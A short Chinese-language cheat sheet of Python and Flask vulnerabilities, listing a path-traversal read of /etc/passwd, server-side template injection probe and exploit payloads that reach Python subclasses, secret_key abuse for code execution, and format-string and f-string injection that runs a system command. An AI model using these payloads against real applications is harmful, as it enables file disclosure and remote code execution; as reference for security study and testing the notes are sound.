Python漏洞
================================

flask
--------------------------------

- 自己解析静态文件=>任意文件读取 ../ * n + /etc/passwd
- 模版注入rce
    - PoC: ``{{ 7*7 }}``
    - Exp: ``{{''.__class__.__mro__[2].__subclasses__()}}``

- 获取app.secret_key
    - 可以RCE
- 格式化字符串

::

    "welcome {user}".format(user=user)
    user = {0.__class__.__init__.__globals__}

    python3.6
    python3 -c "f'''{__import__('os').system('id')}'''"